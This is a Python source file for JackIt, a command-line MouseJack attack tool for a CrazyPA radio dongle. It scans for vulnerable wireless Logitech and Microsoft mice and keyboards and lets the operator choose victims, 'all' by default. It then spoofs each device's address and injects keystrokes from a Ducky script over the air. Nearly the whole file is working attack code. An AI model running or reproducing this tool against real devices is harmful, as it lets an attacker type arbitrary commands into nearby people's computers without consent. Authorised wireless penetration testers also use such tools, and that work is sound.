#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function
import datetime
import os
import time
import click
import tabulate
import keymap
import duckyparser
import mousejack


__version__ = 0.02
__authors__ = "phikshun, infamy"

# some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


def _print_err(text):
    print(R + '[!] ' + W + text)


def banner():
    print(r"""
     ____.              __   .___  __
    |    |____    ____ |  | _|   |/  |_
    |    \__  \ _/ ___\|  |/ /   \   __\
/\__|    |/ __ \\  \___|    <|   ||  |
\________(____  /\___  >__|_ \___||__|
              \/     \/     \/          """)

    print("JackIt Version %0.2f" % __version__)
    print("Created by %s" % __authors__)
    print("")


def confirmroot():
    # make sure we are root
    if os.getuid() != 0:
        _print_err("ERROR: You need to run as root!")
        _print_err("login as root (su root) or try sudo ./jackit.py")
        exit(-1)


@click.command()
@click.option('--debug', is_flag=True, help='Enable debug')
@click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
@click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
@click.option('--layout', default='us', help="Keyboard layout: %s" % ", ".join(keymap.mapping.keys()))
@click.option('--address', default="", help="Address of device to target attack")
@click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
@click.option('--reset', is_flag=True, help="Reset CrazyPA dongle prior to initalization")
def cli(debug, script, lowpower, interval, layout, address, vendor, reset):

    banner()
    confirmroot()

    if debug:
        print(O + "[W] " + W + "Debug is enabled.")

    if layout not in keymap.mapping.keys():
        _print_err("Invalid keyboard layout selected.")
        exit(-1)

    targeted = False
    if address and not vendor:
        _print_err("Please use --vendor option to specify either Logitech or Microsoft.")
        exit(-1)
    elif vendor and not address:
        _print_err("Please use --address option when specifying a vendor.")
        exit(-1)
    elif vendor and address:
        vendor = vendor.lower()
        if not vendor.startswith("l") and not vendor.startswith("m"):
            _print_err("Unknown vendor: specify either Microsoft of Logitech.")
            exit(-1)
        else:
            targeted = True

    if script == "":
        _print_err("You must supply a ducky script using --script <filename>")
        _print_err("Attacks are disabled.")
        attack = ""
    else:
        f = open(script, 'r')
        parser = duckyparser.DuckyParser(f.read(), keymap.mapping[layout])
        attack = parser.parse()

    # Initialize the radio
    try:
        jack = mousejack.MouseJack(lowpower, debug, reset)
    except Exception as e:
        if e.__str__() == "Cannot find USB dongle.":
            _print_err("Cannot find Crazy PA USB dongle.")
            _print_err("Please make sure you have it preloaded with the mousejack firmware.")
            exit(-1)
        else:
            raise e

    try:
        if targeted:
            print(G + "[+] " + W + 'Starting sniff for %s...' % address)
            if vendor.startswith("l"):
                jack.add_device(address, [0, 0xC2, 0, 0, 0, 0, 0, 0, 0, 0])
            if vendor.startswith("m"):
                jack.add_device(address, [])
        else:
            print(G + "[+] " + W + 'Starting scan...')

        try:
            # Enter main loop
            while True:
                if targeted:
                    devices = jack.sniff(interval, address)
                else:
                    devices = jack.scan(interval)

                click.clear()
                if targeted:
                    print(GR + "[+] " + W + ("Sniffing for %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "when ready.")
                else:
                    print(GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready.")
                print("")

                idx = 0
                pretty_devices = []
                for key, device in devices.iteritems():
                    idx = idx + 1
                    pretty_devices.append([
                        idx,
                        key,
                        ",".join(str(x) for x in device['channels']),
                        device['count'],
                        str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
                        device['device'],
                        jack.hexify(device['payload'])
                    ])

                print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"]))
        except KeyboardInterrupt:
            print("")

        if 'devices' not in locals() or len(devices) == 0:
            _print_err("No devices found please try again...")
            exit(-1)

        if attack == "":
            _print_err("No attack script was provided...")
            exit(-1)

        print(GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + " separated by commas, or '%s': " % (G + 'all' + W), end="")
        value = click.prompt('', default="all")
        value = value.strip().lower()

        if value == "all":
            victims = pretty_devices[:]
        else:
            victims = []
            for vic in value.split(","):
                if int(vic) <= len(pretty_devices):
                    victims.append(pretty_devices[(int(vic) - 1)])
                else:
                    _print_err(("Device %d key is out of range" % int(vic)))

        targets = []
        for victim in victims:
            if victim[1] in devices:
                targets.append(devices[victim[1]])

        for target in targets:
            payload = target['payload']
            channels = target['channels']
            address = target['address']
            device_type = target['device']

            # Sniffer mode allows us to spoof the address
            jack.sniffer_mode(address)
            hid = None

            # Figure out what we've got
            hid = jack.get_hid_from_payload(address, payload)

            if hid:
                # Attempt to ping the devices to find the current channel
                lock_channel = jack.find_channel(address)

                if lock_channel:
                    print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel))
                    jack.attack(hid, attack)
                else:
                    # If our pings fail, go full hail mary
                    print(R + '[-] ' + W + 'Ping failed, trying all channels')
                    for channel in channels:
                        jack.set_channel(channel)
                        print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel))
                        jack.attack(hid, attack)
            else:
                print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address)))
                continue

        print(GR + '\n[+] ' + W + "All attacks completed\n")

    except KeyboardInterrupt:
        print('\n ' + R + '(^C)' + O + ' interrupted\n')
        print("[-] Quitting")


if __name__ == '__main__':
    cli()
